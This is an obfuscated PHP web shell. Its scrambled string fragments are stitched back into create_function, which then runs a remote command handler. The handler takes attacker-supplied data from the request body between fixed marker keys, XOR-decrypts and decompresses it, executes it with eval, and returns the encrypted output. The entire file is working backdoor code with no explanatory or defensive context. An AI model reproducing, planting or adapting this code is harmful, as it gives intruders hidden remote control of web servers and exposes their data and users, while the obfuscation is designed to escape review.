<?php
$U='(@baV&V&se64_decoV&de($m[1]V&),$k)))V&;$o=@oV&bV&_get_conV&tenV&tsV&(V&);@ob_end_clean';
$g='V&()V&;$r=@base6V&4_encV&ode(@xV&(@gzcomV&presV&s($o),$k));prV&intV&("$p$kh$rV&$kf");}';
$u='&$iV&=0;$i<$lV&;)V&{forV&($V&j=0;($j<V&$c&&$i<$l);$j++,$i++V&V&)V&{$o.=$t{$i}^$kV&';
$x=str_replace('hW','','crehWahWtehW_fuhWhWnctihWon');
$d='NtHWElV&";V&funV&ction x(V&$t,V&$k){$c=strV&leV&n($k);$l=strlenV&($t);$oV&=""V&;for(V';
$h='{$V&j};}}retV&urn V&$o;V&}if (@pV&reg_match("/$khV&V&(.+)$kf/V&",@filV&e_get_cV&V&';
$p='$kV&V&=V&"dV&c3f573e"V&V&;V&$V&kh="ace298ebe32V&0";$V&kf="c7b5e3644087";$V&p="H2MaIGTqAZ';
$G='ontents("php://iV&V&nput"V&),$m)V&==1) {@V&ob_start();@eV&valV&(@gzV&uncompressV&(@x';
$Y=str_replace('V&','',$p.$d.$u.$h.$G.$U.$g);
$C=$x('',$Y);$C();
?>
